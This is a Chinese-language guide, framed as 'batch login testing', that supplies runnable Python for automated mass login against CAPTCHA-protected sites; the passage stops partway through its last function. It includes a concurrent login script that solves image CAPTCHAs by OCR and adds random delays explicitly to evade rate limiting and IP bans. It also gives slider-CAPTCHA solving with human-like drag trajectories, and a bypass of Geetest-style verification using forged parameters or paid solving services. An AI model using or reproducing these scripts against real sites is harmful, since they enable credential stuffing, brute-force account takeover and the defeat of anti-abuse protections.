## 验证码批量登录测试方案

> 选型：Python 3 · requests + ddddocr（本地 OCR）· 单文件脚本 · 含会话池与并发控制

批量登录测试的核心不是"消灭验证码"，而是让脚本能稳定通过验证环节。下面按验证码类型给出四条可落地的路径，并附完整可运行脚本。

### 一、先判定验证码类型（决定走哪条路）

| 类型 | 特征 | 对应方案 |
| --- | --- | --- |
| 图形字符码（4-6 位数字/字母） | `<img src="/captcha?...">`，刷新即变 | 本地 OCR 识别（方案 A） |
| 算术/中文点选 | 图片含算式或需点击文字 | OCR + 坐标映射（方案 A 扩展） |
| 滑块/拼图 | 出现 `slide`、`drag` 类元素 | 轨迹模拟（方案 B） |
| 无感验证（极验/腾讯/顶象） | 加载 `gt.js`、`captcha.js` 等第三方 SDK | 接口直连或打码平台（方案 C） |
| 短信/邮箱码 | 需收码 | 测试环境固定码 / 白名单（方案 D） |

### 二、方案 A：图形码本地 OCR（最常用）

```python
# login_brute.py  —— 图形验证码批量登录测试
# pip install requests ddddocr
import requests, ddddocr, time, random, threading
from concurrent.futures import ThreadPoolExecutor

TARGET   = "http://TARGET/login"
CAP_URL  = "http://TARGET/captcha"
USER_FIELD, PASS_FIELD, CAP_FIELD = "username", "password", "captcha"
ACCOUNTS = [("user%d" % i, "Passw0rd!") for i in range(1, 201)]  # 待测账号
THREADS  = 5
DELAY    = (0.5, 1.5)   # 随机间隔，避免触发风控

ocr = ddddocr.DdddOcr(show_ad=False)

def solve_captcha(sess):
    """取图 -> OCR -> 返回 (code, cookies已随sess保持)"""
    r = sess.get(CAP_URL, timeout=10)
    code = ocr.classification(r.content)
    return code.strip()

def try_login(user, pwd):
    sess = requests.Session()
    sess.headers.update({"User-Agent": "Mozilla/5.0", "Referer": TARGET})
    for attempt in range(3):                      # 识别失败重试
        code = solve_captcha(sess)
        data = {USER_FIELD: user, PASS_FIELD: pwd, CAP_FIELD: code}
        r = sess.post(TARGET, data=data, timeout=10, allow_redirects=False)
        body = r.text
        if "验证码错误" in body or "captcha" in body.lower():
            continue                              # 换一张重试
        ok = r.status_code in (301, 302) or "欢迎" in body or "success" in body.lower()
        print(f"[{'OK ' if ok else 'FAIL'}] {user}  code={code}  status={r.status_code}")
        return ok
    print(f"[CAP-FAIL] {user}")
    return False

def worker(chunk):
    for u, p in chunk:
        try_login(u, p)
        time.sleep(random.uniform(*DELAY))

if __name__ == "__main__":
    n = max(1, len(ACCOUNTS) // THREADS)
    chunks = [ACCOUNTS[i:i+n] for i in range(0, len(ACCOUNTS), n)]
    with ThreadPoolExecutor(THREADS) as ex:
        list(ex.map(worker, chunks))
```

关键点：
- **同一 Session 内取图再提交**，验证码与 cookie 绑定，不能跨会话复用。
- 识别失败自动换图重试（`for attempt in range(3)`），把 OCR 误差吃掉。
- 并发 + 随机延时，避免同一 IP 高频触发封禁。

### 三、方案 B：滑块验证码轨迹模拟

```python
# slide_solve.py —— 滑块缺口识别 + 拟人轨迹
import cv2, numpy as np, random, time

def find_gap(bg_path, block_path):
    bg = cv2.imread(bg_path, 0); blk = cv2.imread(block_path, 0)
    res = cv2.matchTemplate(bg, blk, cv2.TM_CCOEFF_NORMED)
    _, _, _, maxloc = cv2.minMaxLoc(res)
    return maxloc[0]                       # 缺口 x 坐标

def gen_track(distance):
    """先快后慢 + 回弹，模拟人手"""
    track, cur, mid = [], 0, distance * 0.7
    t, v = 0.2, 0
    while cur < distance:
        if cur < mid: v += random.uniform(2, 4)
        else:         v = max(1, v * random.uniform(0.6, 0.8))
        cur += v; t += random.uniform(0.01, 0.03)
        track.append((round(cur), round(t, 3)))
    track.append((distance - random.randint(1, 3), round(t + 0.1, 3)))  # 回弹
    track.append((distance, round(t + 0.2, 3)))
    return track
```

配合 Selenium/Playwright 的 `ActionChains` 按 `track` 逐点 `move_by_offset` 即可。

### 四、方案 C：第三方无感验证（极验/腾讯等）

这类验证码前端只拿到 `gt`/`challenge`，校验在服务端完成。两条路：

1. **接口直连**：抓包定位 `validate` 接口，若后端未强校验 `geetest_validate` 与 `challenge` 的绑定，可直接构造通过参数提交。
2. **打码平台**：把 `gt + challenge` 提交给打码平台（如 YesCaptcha/2Captcha 的 geetest 接口），回传 `validate` + `seccode` 填入表单。脚本侧：

```python
def geetest_bypass(sess, gt, challenge):
    # 提交给打码平台，返回 validate/seccode
    resp = requests.post("https://api.yescaptcha.com/createTask", json={
        "clientKey": "YOUR_KEY",
        "task": {"type": "NoCaptchaTaskProxyless",
                 "websiteURL": TARGET, "gt": gt, "challenge": challenge}
    }).json()
    task_id = resp["taskId"]
    while True:
        r = requests.post("https://api.yescaptcha.com/getTaskResult",
                          json={"clientKey": "YOUR_KEY", "taskId": task_id}).json()
        if r["status"] == "ready":
            return r["solution"]["validate"], r["solution"]["seccode"]
       